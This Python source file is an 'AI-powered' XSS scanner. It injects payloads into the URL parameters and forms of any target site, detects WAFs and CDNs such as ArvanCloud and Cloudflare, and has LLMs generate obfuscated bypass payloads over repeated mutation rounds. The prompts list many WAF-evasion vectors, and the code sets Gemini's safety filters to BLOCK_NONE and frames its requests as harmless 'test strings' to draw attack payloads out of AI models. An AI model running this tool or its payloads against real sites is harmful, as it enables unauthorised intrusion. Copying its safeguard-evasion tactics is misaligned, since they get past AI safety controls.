#!/usr/bin/env python3
"""
XSS Hunter - AI-Powered XSS Vulnerability Scanner
Detects and exploits XSS vulnerabilities with CDN/WAF bypass techniques
Uses AI models (OpenAI, Gemini, Claude) to generate smart payloads
"""

import requests
import re
import urllib.parse
from bs4 import BeautifulSoup
from typing import List, Dict, Tuple, Optional
import json
import time
from dataclasses import dataclass
from colorama import Fore, Style, init
import argparse
import os
from abc import ABC, abstractmethod

# Initialize colorama
init(autoreset=True)


@dataclass
class XSSPayload:
    """Represents an XSS payload with metadata"""
    payload: str
    technique: str
    bypass_type: str
    context: str


class AIProvider(ABC):
    """Abstract base class for AI providers"""
    
    @abstractmethod
    def generate_payloads(self, prompt: str) -> List[str]:
        """Generate XSS payloads using AI"""
        pass


class OpenAIProvider(AIProvider):
    """OpenAI GPT provider"""
    
    def __init__(self, api_key: str, model: str = "gpt-4"):
        self.api_key = api_key
        self.model = model
        self.base_url = "https://api.openai.com/v1/chat/completions"
    
    def generate_payloads(self, prompt: str) -> List[str]:
        """Generate payloads using OpenAI"""
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        
        data = {
            "model": self.model,
            "messages": [
                {
                    "role": "system",
                    "content": "You are a security researcher specializing in XSS vulnerabilities. Generate creative XSS payloads. Return ONLY a JSON array of payloads, nothing else."
                },
                {
                    "role": "user",
                    "content": prompt
                }
            ],
            "temperature": 0.9,
            "max_tokens": 2000
        }
        
        try:
            response = requests.post(self.base_url, headers=headers, json=data, timeout=30)
            response.raise_for_status()
            
            content = response.json()['choices'][0]['message']['content']
            # Extract JSON array from response
            payloads = json.loads(content)
            return payloads if isinstance(payloads, list) else []
        except Exception as e:
            print(f"OpenAI Error: {e}")
            return []


class GeminiProvider(AIProvider):
    """Google Gemini provider"""
    
    def __init__(self, api_key: str, model: str = "gemini-2.5-flash"):
        self.api_key = api_key
        self.model = model
        self.base_url = "https://generativelanguage.googleapis.com/v1beta"
    
    def generate_payloads(self, prompt: str) -> List[str]:
        """Generate payloads using Gemini"""
        headers = {
            "Content-Type": "application/json"
        }
        
        data = {
            "contents": [{
                "parts": [{
                    "text": prompt
                }]
            }],
            "generationConfig": {
                "temperature": 0.7,
                "maxOutputTokens": 8192
            },
            "safetySettings": [
                {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_NONE"},
                {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_NONE"},
                {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_NONE"},
                {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_NONE"}
            ]
        }
        
        try:
            # Try different model names (Gemini 2.5 models)
            model_names = [
                self.model,
                "gemini-2.5-flash",
                "gemini-2.5-flash-preview-05-20",
    
            ]
            
            for model_name in model_names:
                try:
                    url = f"{self.base_url}/models/{model_name}:generateContent?key={self.api_key}"
                    response = requests.post(url, headers=headers, json=data, timeout=30)
                    
                    if response.status_code == 200:
                        result = response.json()
                        
                        # Handle different response structures
                        try:
                            if 'candidates' in result and len(result['candidates']) > 0:
                                candidate = result['candidates'][0]
                                
                                if 'content' in candidate:
                                    content_obj = candidate['content']
                                    
                                    if 'parts' in content_obj and len(content_obj['parts']) > 0:
                                        content = content_obj['parts'][0]['text']
                                    else:
                                        # Response blocked or no content
                                        continue
                                elif 'text' in candidate:
                                    content = candidate['text']
                                else:
                                    continue
                            else:
                                continue
                        except (KeyError, IndexError) as e:
                            continue
                        
                        # Extract JSON from response
                        content = content.strip()
                        if '```json' in content:
                            content = content.split('```json')[1].split('```')[0].strip()
                        elif '```' in content:
                            content = content.split('```')[1].split('```')[0].strip()
                        elif '[' in content:
                            # Find JSON array boundaries
                            start = content.find('[')
                            end = content.rfind(']') + 1
                            if start != -1 and end > start:
                                content = content[start:end]
                        
                        # Try to parse JSON
                        try:
                            payloads = json.loads(content)
                            if isinstance(payloads, list) and len(payloads) > 0:
                                return payloads
                        except json.JSONDecodeError as e:
                            # If JSON parsing fails, try to extract payloads manually
                            import re
                            matches = re.findall(r'"([^"]*<[^>]+>[^"]*)"', content)
                            if matches:
                                return matches
                        
                        # If we got here, parsing failed but we had a 200 response
                        # Continue to try next model
                        continue
                        
                except Exception as e:
                    continue
            
            # If all models fail
            raise Exception(f"All Gemini models failed")
            
        except Exception as e:
            print(f"Gemini Error: {e}")
            return []


class ClaudeProvider(AIProvider):
    """Anthropic Claude provider"""
    
    def __init__(self, api_key: str, model: str = "claude-3-sonnet-20240229"):
        self.api_key = api_key
        self.model = model
        self.base_url = "https://api.anthropic.com/v1/messages"
    
    def generate_payloads(self, prompt: str) -> List[str]:
        """Generate payloads using Claude"""
        headers = {
            "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01",
            "Content-Type": "application/json"
        }
        
        data = {
            "model": self.model,
            "max_tokens": 2000,
            "temperature": 0.9,
            "messages": [
                {
                    "role": "user",
                    "content": f"You are a security researcher specializing in XSS. Generate creative XSS payloads. Return ONLY a JSON array of payloads, nothing else.\n\n{prompt}"
                }
            ]
        }
        
        try:
            response = requests.post(self.base_url, headers=headers, json=data, timeout=30)
            response.raise_for_status()
            
            content = response.json()['content'][0]['text']
            # Extract JSON from response
            content = content.strip()
            if content.startswith('```json'):
                content = content.split('```json')[1].split('```')[0].strip()
            elif content.startswith('```'):
                content = content.split('```')[1].split('```')[0].strip()
            
            payloads = json.loads(content)
            return payloads if isinstance(payloads, list) else []
        except Exception as e:
            print(f"Claude Error: {e}")
            return []


class OllamaProvider(AIProvider):
    """Ollama local AI provider"""
    
    def __init__(self, model: str = "llama2", base_url: str = "http://localhost:11434"):
        self.model = model
        self.base_url = base_url
    
    def generate_payloads(self, prompt: str) -> List[str]:
        """Generate payloads using Ollama"""
        url = f"{self.base_url}/api/generate"
        
        data = {
            "model": self.model,
            "prompt": f"You are a security researcher. Generate 10 creative XSS payloads for bypassing WAF/CDN. Return ONLY a JSON array of payloads.\n\n{prompt}\n\nJSON array:",
            "stream": False,
            "options": {
                "temperature": 0.9
            }
        }
        
        try:
            response = requests.post(url, json=data, timeout=60)
            response.raise_for_status()
            
            content = response.json()['response']
            # Extract JSON from response
            content = content.strip()
            if content.startswith('```json'):
                content = content.split('```json')[1].split('```')[0].strip()
            elif content.startswith('```'):
                content = content.split('```')[1].split('```')[0].strip()
            
            payloads = json.loads(content)
            return payloads if isinstance(payloads, list) else []
        except Exception as e:
            print(f"Ollama Error: {e}")
            return []


class CDNDetector:
    """Detects CDN and WAF protection"""
    
    CDN_HEADERS = {
        'cloudflare': ['cf-ray', 'cf-cache-status', '__cfduid'],
        'arvancloud': ['ar-poweredby', 'ar-status', 'server: ArvanCloud'],
        'akamai': ['akamai-origin-hop', 'x-akamai-transformed'],
        'fastly': ['fastly-io-info', 'x-fastly-request-id'],
        'cloudfront': ['x-amz-cf-id', 'x-amz-cf-pop'],
        'incapsula': ['x-cdn', 'x-iinfo'],
        'sucuri': ['x-sucuri-id', 'x-sucuri-cache'],
        'stackpath': ['x-stackpath-request-id']
    }
    
    @staticmethod
    def detect(response: requests.Response) -> List[str]:
        """Detect CDN/WAF from response headers and content"""
        detected = []
        headers_lower = {k.lower(): v.lower() if isinstance(v, str) else v for k, v in response.headers.items()}
        
        # Check headers
        for cdn_name, cdn_headers in CDNDetector.CDN_HEADERS.items():
            for header in cdn_headers:
                header_lower = header.lower()
                # Check if it's a key-value pattern like "server: ArvanCloud"
                if ':' in header_lower:
                    key, value = header_lower.split(':', 1)
                    key = key.strip()
                    value = value.strip()
                    if key in headers_lower and value in headers_lower[key]:
                        detected.append(cdn_name)
                        break
                else:
                    if header_lower in headers_lower:
                        detected.append(cdn_name)
                        break
        
        # Check response content for CDN signatures
        response_lower = response.text.lower()
        
        # ArvanCloud detection
        if '/cdn-cgi/' in response_lower or 'arvancloud' in response_lower or 'آروان' in response.text:
            if 'arvancloud' not in detected:
                detected.append('arvancloud')
        
        # Cloudflare detection
        if 'cloudflare' in response_lower or 'cf-ray' in response_lower:
            if 'cloudflare' not in detected:
                detected.append('cloudflare')
        
        # Check for WAF block pages
        if response.status_code == 403:
            if 'waf' in response_lower or 'firewall' in response_lower or 'دیواره' in response.text:
                detected.append('waf_detected')
        elif 'blocked' in response_lower or 'forbidden' in response_lower:
            detected.append('waf_detected')
        
        return detected


class PayloadGenerator:
    """Generates XSS payloads using AI models"""
    
    def __init__(self, ai_provider: Optional[AIProvider] = None):
        self.ai_provider = ai_provider
        
        # Minimal fallback payloads if AI fails
        self.fallback_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ]
    
    def generate_ai_payloads(self, cdn_type: str, context: str, response_sample: str = "") -> List[XSSPayload]:
        """Generate payloads using AI based on CDN type and context"""
        if not self.ai_provider:
            return self._get_fallback_payloads()
        
        prompt = self._build_prompt(cdn_type, context, response_sample)
        
        try:
            payload_strings = self.ai_provider.generate_payloads(prompt)
            
            payloads = []
            for payload_str in payload_strings:
                payloads.append(XSSPayload(
                    payload=payload_str,
                    technique="AI-generated",
                    bypass_type=cdn_type,
                    context=context
                ))
            
            return payloads if payloads else self._get_fallback_payloads()
        
        except Exception as e:
            print(f"AI generation failed: {e}")
            return self._get_fallback_payloads()
    
    def _build_prompt(self, cdn_type: str, context: str, response_sample: str) -> str:
        """Build prompt for AI to generate payloads"""
        
        # ArvanCloud specific techniques
        if cdn_type == 'arvancloud':
            prompt = f"""Generate 20 advanced HTML test strings to bypass ArvanCloud WAF.

ArvanCloud blocks common patterns. Use creative techniques:

1. **Encoding variations:**
   - Mix of hex, unicode, HTML entities
   - Double encoding: &#x26;#x61; (encode the & itself)
   - URL encoding: %3C%73%63%72%69%70%74%3E
   - Base64 in data URIs

2. **Tag obfuscation:**
   - Null bytes: <scri\\x00pt>
   - Comments: <scr<!---->ipt>
   - Case mixing: <ScRiPt>
   - Newlines: <scri\\npt>

3. **Event handler variations:**
   - Rare events: onanimationstart, onloadstart, ontransitionend
   - Without quotes: onerror=alert(1)
   - With backticks: onerror=alert`1`

4. **Advanced vectors:**
   - SVG with foreignObject
   - MathML: <math><mtext><script>
   - iframe srcdoc with encoding
   - CSS expression (old IE)
   - Form action=javascript:

5. **Context breaking:**
   - Close existing tags first
   - Attribute injection: " autofocus onfocus=
   - JavaScript template literals

Return 20 creative payloads as JSON array:
["payload1", "payload2", ...]

JSON array:"""
        
        # Cloudflare specific
        elif cdn_type == 'cloudflare':
            prompt = f"""Generate 20 HTML test strings to bypass Cloudflare WAF.

Focus on:
- SVG with animate/set elements
- HTML5 form elements with autofocus
- Data URIs with base64
- Unicode normalization tricks
- Template literals and modern JS

JSON array:"""
        
        # Generic
        else:
            prompt = f"""Generate 20 HTML test strings for security testing.

Include:
- Various HTML tags (script, img, svg, iframe, object, embed)
- Event handlers (onerror, onload, onfocus, ontoggle)
- Encoding (HTML entities, unicode, hex)
- Modern JS syntax (template literals, arrow functions)

JSON array:"""
        
        return prompt
    
    def _get_fallback_payloads(self) -> List[XSSPayload]:
        """Return fallback payloads when AI is unavailable"""
        return [
            XSSPayload(
                payload=p,
                technique="fallback",
                bypass_type="generic",
                context="html"
            ) for p in self.fallback_payloads
        ]
    
    def generate_mutation_payloads(self, original_payload: str, failed_attempts: List[str], cdn_type: str = 'generic') -> List[str]:
        """Use AI to mutate payloads that didn't work - with learning"""
        if not self.ai_provider:
            return []
        
        # Analyze what didn't work
        blocked_patterns = []
        if any('<script' in p.lower() for p in failed_attempts):
            blocked_patterns.append("script tags")
        if any('onerror' in p.lower() for p in failed_attempts):
            blocked_patterns.append("onerror handlers")
        if any('<svg' in p.lower() for p in failed_attempts):
            blocked_patterns.append("svg elements")
        
        blocks_info = f"Blocked patterns: {', '.join(blocked_patterns)}" if blocked_patterns else "All common patterns blocked"
        
        if cdn_type == 'arvancloud':
            prompt = f"""ArvanCloud WAF blocked all previous attempts. {blocks_info}

Generate 15 HIGHLY OBFUSCATED payloads using advanced bypass techniques:

**Critical: Avoid detected patterns!**

Use these advanced methods:

1. **Heavy encoding:**
   - JSFuck style: [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]]
   - Hex encoding: \\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e
   - Unicode: \\u003cscript\\u003e
   - Mixed: <\\u0073cript>

2. **Polyglot payloads:**
   - jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )
   - Multi-context: ';alert(String.fromCharCode(88,83,83))//

3. **Rare/exotic vectors:**
   - <form><button formaction=javascript:alert(1)>
   - <input type=image src=x:x onerror=alert(1)>
   - <isindex action=javascript:alert(1) type=image>
   - <object data=javascript:alert(1)>
   - <embed src=javascript:alert(1)>
   - <link rel=import href=data:text/html,<script>alert(1)</script>>

4. **DOM clobbering:**
   - <form name=x><input id=y></form><script>x.y.value='xss'</script>

5. **CSS injection:**
   - <style>@import'javascript:alert(1)';</style>
   - <div style="xss:expression(alert(1))">

6. **Protocol handlers:**
   - <a href="data:text/html,<script>alert(1)</script>">
   - <a href="vbscript:msgbox(1)">

7. **Mutation XSS:**
   - <noscript><p title="</noscript><img src=x onerror=alert(1)>">

Return 15 creative, heavily obfuscated payloads as JSON array:"""
        
        else:
            prompt = f"""Previous attempts failed. {blocks_info}

Generate 15 alternative payloads avoiding detected patterns:
- Use different tags and handlers
- Apply encoding (unicode, hex, entities)
- Try polyglot approaches
- Use rare HTML5 features

JSON array:"""
        
        try:
            return self.ai_provider.generate_payloads(prompt)
        except:
            return []


class XSSScanner:
    """Main XSS scanner with AI-powered detection"""
    
    def __init__(self, url: str, ai_provider: Optional[AIProvider] = None, verbose: bool = False):
        self.url = url
        self.verbose = verbose
        self.ai_provider = ai_provider
        self.payload_generator = PayloadGenerator(ai_provider)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        self.failed_payloads = []
        
    def log(self, message: str, level: str = "info"):
        """Log messages with colors"""
        if not self.verbose and level == "debug":
            return
            
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "debug": Fore.MAGENTA
        }
        print(f"{colors.get(level, '')}{message}{Style.RESET_ALL}")
    
    def extract_parameters(self) -> Dict[str, str]:
        """Extract URL parameters"""
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query)
        return {k: v[0] if v else '' for k, v in params.items()}
    
    def find_forms(self, html: str) -> List[Dict]:
        """Find all forms in HTML"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            
            for input_tag in form.find_all(['input', 'textarea']):
                form_data['inputs'].append({
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                })
            
            forms.append(form_data)
        
        return forms
    
    def detect_context(self, response: str, payload: str) -> str:
        """Detect the context where payload was reflected"""
        if f"<script>{payload}</script>" in response:
            return "html"
        elif f"'{payload}'" in response or f'"{payload}"' in response:
            return "attribute"
        elif f"javascript:{payload}" in response:
            return "javascript"
        return "unknown"
    
    def test_payload(self, test_url: str, payload: str, method: str = 'GET', data: Dict = None) -> Tuple[bool, Optional[requests.Response]]:
        """Test a single payload"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(test_url, timeout=10, allow_redirects=True)
            else:
                response = self.session.post(test_url, data=data, timeout=10, allow_redirects=True)
            
            # Check if payload is reflected
            if payload in response.text:
                # Check if it's actually executed (not encoded)
                if not any(encoded in response.text for encoded in [
                    payload.replace('<', '&lt;').replace('>', '&gt;'),
                    payload.replace('<', '&#60;').replace('>', '&#62;'),
                ]):
                    return True, response
            
            return False, response
            
        except Exception as e:
            self.log(f"Error testing payload: {e}", "error")
            return False, None
    
    def scan_url_parameters(self):
        """Scan URL parameters for XSS using AI-generated payloads"""
        self.log(f"\n[*] Scanning URL: {self.url}", "info")
        
        # Get initial response
        try:
            initial_response = self.session.get(self.url, timeout=10)
            cdn_types = CDNDetector.detect(initial_response)
            
            if cdn_types:
                self.log(f"[+] Detected protection: {', '.join(cdn_types)}", "warning")
                cdn_type = cdn_types[0] if cdn_types[0] != 'waf_detected' else 'generic'
            else:
                self.log("[+] No CDN/WAF detected", "success")
                cdn_type = 'none'
            
        except Exception as e:
            self.log(f"[-] Error accessing URL: {e}", "error")
            return
        
        # Extract parameters
        params = self.extract_parameters()
        if not params:
            self.log("[!] No URL parameters found", "warning")
            return
        
        self.log(f"[+] Found {len(params)} parameters: {', '.join(params.keys())}", "info")
        
        # Test each parameter
        for param_name, param_value in params.items():
            self.log(f"\n[*] Testing parameter: {param_name}", "info")
            
            # Generate AI payloads
            if self.ai_provider:
                self.log("[*] Generating AI-powered payloads...", "info")
                ai_payloads = self.payload_generator.generate_ai_payloads(
                    cdn_type=cdn_type,
                    context='html',
                    response_sample=initial_response.text[:1000]
                )
                self.log(f"[+] Generated {len(ai_payloads)} AI payloads", "success")
            else:
                self.log("[!] No AI provider configured, using fallback payloads", "warning")
                ai_payloads = self.payload_generator._get_fallback_payloads()
            
            # Test payloads
            for i, payload_obj in enumerate(ai_payloads, 1):
                payload = payload_obj.payload
                
                # Create test URL
                test_params = params.copy()
                test_params[param_name] = payload
                
                parsed = urllib.parse.urlparse(self.url)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    urllib.parse.urlencode(test_params),
                    parsed.fragment
                ))
                
                self.log(f"[{i}/{len(ai_payloads)}] Testing: {payload[:50]}...", "debug")
                
                is_vulnerable, response = self.test_payload(test_url, payload)
                
                if is_vulnerable:
                    self.log(f"[!] VULNERABLE! Payload: {payload}", "success")
                    self.vulnerabilities.append({
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': 'GET',
                        'technique': payload_obj.technique
                    })
                    
                    # Don't test more payloads for this parameter
                    break
                else:
                    self.failed_payloads.append(payload)
                
                # Rate limiting
                time.sleep(0.1)
            
            # If no vulnerability found, try AI mutations (multiple rounds)
            if not any(v['parameter'] == param_name for v in self.vulnerabilities):
                if self.ai_provider and self.failed_payloads:
                    # Round 1: First mutation attempt
                    self.log("[*] Round 1: Generating advanced mutation payloads...", "info")
                    mutations = self.payload_generator.generate_mutation_payloads(
                        self.failed_payloads[0],
                        self.failed_payloads[:5],
                        cdn_type
                    )
                    
                    mutation_round = 1
                    max_rounds = 3  # Try up to 3 rounds of mutations
                    
                    while mutation_round <= max_rounds and mutations:
                        self.log(f"[*] Testing {len(mutations)} mutation payloads (Round {mutation_round})...", "info")
                        
                        round_failed = []
                        for i, payload in enumerate(mutations[:15], 1):
                            test_params = params.copy()
                            test_params[param_name] = payload
                            
                            parsed = urllib.parse.urlparse(self.url)
                            test_url = urllib.parse.urlunparse((
                                parsed.scheme,
                                parsed.netloc,
                                parsed.path,
                                parsed.params,
                                urllib.parse.urlencode(test_params),
                                parsed.fragment
                            ))
                            
                            self.log(f"[R{mutation_round}-{i}/{len(mutations[:15])}] Testing: {payload[:60]}...", "debug")
                            
                            is_vulnerable, response = self.test_payload(test_url, payload)
                            
                            if is_vulnerable:
                                self.log(f"[!] VULNERABLE! Mutation payload (Round {mutation_round}): {payload}", "success")
                                self.vulnerabilities.append({
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'method': 'GET',
                                    'technique': f'AI-mutation-round-{mutation_round}'
                                })
                                break
                            else:
                                round_failed.append(payload)
                            
                            time.sleep(0.1)
                        
                        # If found vulnerability, stop
                        if any(v['parameter'] == param_name for v in self.vulnerabilities):
                            break
                        
                        # Generate next round of mutations if needed
                        mutation_round += 1
                        if mutation_round <= max_rounds and round_failed:
                            self.log(f"[*] Round {mutation_round}: Generating even more advanced payloads...", "info")
                            mutations = self.payload_generator.generate_mutation_payloads(
                                round_failed[0],
                                round_failed[:10],
                                cdn_type
                            )
                        else:
                            break
    
    def scan_forms(self):
        """Scan forms for XSS"""
        try:
            response = self.session.get(self.url, timeout=10)
            forms = self.find_forms(response.text)
            
            if not forms:
                self.log("[!] No forms found", "warning")
                return
            
            self.log(f"[+] Found {len(forms)} forms", "info")
            
            for i, form in enumerate(forms, 1):
                self.log(f"\n[*] Testing form {i}", "info")
                
                # Prepare form action URL
                action = form['action']
                if not action:
                    action = self.url
                elif not action.startswith('http'):
                    parsed = urllib.parse.urlparse(self.url)
                    action = urllib.parse.urljoin(f"{parsed.scheme}://{parsed.netloc}", action)
                
                # Test each input
                for input_field in form['inputs']:
                    if not input_field['name']:
                        continue
                    
                    self.log(f"[*] Testing input: {input_field['name']}", "info")
                    
                    # Generate AI payloads for forms
                    if self.ai_provider:
                        ai_payloads = self.payload_generator.generate_ai_payloads(
                            cdn_type='generic',
                            context='html',
                            response_sample=""
                        )[:10]  # Limit for forms
                    else:
                        ai_payloads = self.payload_generator._get_fallback_payloads()
                    
                    # Prepare form data
                    form_data = {inp['name']: inp.get('value', 'test') 
                                for inp in form['inputs'] if inp['name']}
                    
                    # Test payloads
                    for payload_obj in ai_payloads:
                        payload = payload_obj.payload
                        form_data[input_field['name']] = payload
                        
                        is_vulnerable, response = self.test_payload(
                            action, payload, method=form['method'], data=form_data
                        )
                        
                        if is_vulnerable:
                            self.log(f"[!] VULNERABLE! Payload: {payload}", "success")
                            self.vulnerabilities.append({
                                'url': action,
                                'parameter': input_field['name'],
                                'payload': payload,
                                'method': form['method'].upper(),
                                'technique': payload_obj.technique
                            })
                            break
                        
                        time.sleep(0.1)
        
        except Exception as e:
            self.log(f"[-] Error scanning forms: {e}", "error")
    
    def generate_report(self):
        """Generate vulnerability report"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}XSS SCAN REPORT")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[+] No XSS vulnerabilities found!{Style.RESET_ALL}")
            return
        
        print(f"{Fore.RED}[!] Found {len(self.vulnerabilities)} XSS vulnerabilities:{Style.RESET_ALL}\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"{Fore.YELLOW}Vulnerability #{i}:{Style.RESET_ALL}")
            print(f"  URL: {vuln['url']}")
            print(f"  Method: {vuln['method']}")
            print(f"  Parameter: {vuln['parameter']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  Technique: {vuln.get('technique', 'unknown')}")
            print()


def main():
    parser = argparse.ArgumentParser(
        description='XSS Hunter - AI-Powered XSS Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://example.com/search?q=test" --ai openai --api-key YOUR_KEY
  %(prog)s -u "http://example.com/page.php?id=1" -v --ai gemini --api-key YOUR_KEY
  %(prog)s -u "http://example.com/form.html" --scan-forms --ai ollama
  %(prog)s -u "http://example.com" --ai claude --api-key YOUR_KEY
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--scan-forms', action='store_true', help='Also scan forms')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    # AI Provider options
    parser.add_argument('--ai', choices=['openai', 'gemini', 'claude', 'ollama'], 
                       help='AI provider to use for payload generation')
    parser.add_argument('--api-key', help='API key for AI provider (not needed for Ollama)')
    parser.add_argument('--ai-model', help='Specific AI model to use (optional)')
    parser.add_argument('--ollama-url', default='http://localhost:11434', 
                       help='Ollama server URL (default: http://localhost:11434)')
    
    args = parser.parse_args()
    
    # Banner
    print(f"{Fore.GREEN}")
    print("╔═══════════════════════════════════════════════════════╗")
    print("║           XSS Hunter - AI-Powered Scanner            ║")
    print("║              CDN/WAF Bypass Techniques                ║")
    print("╚═══════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}\n")
    
    # Initialize AI provider
    ai_provider = None
    if args.ai:
        print(f"{Fore.CYAN}[*] Initializing AI provider: {args.ai}{Style.RESET_ALL}")
        
        try:
            if args.ai == 'openai':
                api_key = args.api_key or os.getenv('OPENAI_API_KEY')
                if not api_key:
                    print(f"{Fore.RED}[-] OpenAI API key required. Use --api-key or set OPENAI_API_KEY env var{Style.RESET_ALL}")
                    return
                model = args.ai_model or 'gpt-4'
                ai_provider = OpenAIProvider(api_key, model)
                
            elif args.ai == 'gemini':
                api_key = args.api_key or os.getenv('GEMINI_API_KEY')
                if not api_key:
                    print(f"{Fore.RED}[-] Gemini API key required. Use --api-key or set GEMINI_API_KEY env var{Style.RESET_ALL}")
                    return
                model = args.ai_model or 'gemini-2.5-flash'
                ai_provider = GeminiProvider(api_key, model)
                
            elif args.ai == 'claude':
                api_key = args.api_key or os.getenv('CLAUDE_API_KEY')
                if not api_key:
                    print(f"{Fore.RED}[-] Claude API key required. Use --api-key or set CLAUDE_API_KEY env var{Style.RESET_ALL}")
                    return
                model = args.ai_model or 'claude-3-sonnet-20240229'
                ai_provider = ClaudeProvider(api_key, model)
                
            elif args.ai == 'ollama':
                model = args.ai_model or 'llama2'
                ai_provider = OllamaProvider(model, args.ollama_url)
            
            print(f"{Fore.GREEN}[+] AI provider initialized successfully{Style.RESET_ALL}\n")
            
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to initialize AI provider: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Continuing with fallback payloads{Style.RESET_ALL}\n")
    else:
        print(f"{Fore.YELLOW}[!] No AI provider specified. Using fallback payloads only.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] For AI-powered scanning, use: --ai [openai|gemini|claude|ollama]{Style.RESET_ALL}\n")
    
    # Create scanner
    scanner = XSSScanner(args.url, ai_provider=ai_provider, verbose=args.verbose)
    
    # Scan URL parameters
    scanner.scan_url_parameters()
    
    # Scan forms if requested
    if args.scan_forms:
        scanner.scan_forms()
    
    # Generate report
    scanner.generate_report()


if __name__ == "__main__":
    main()
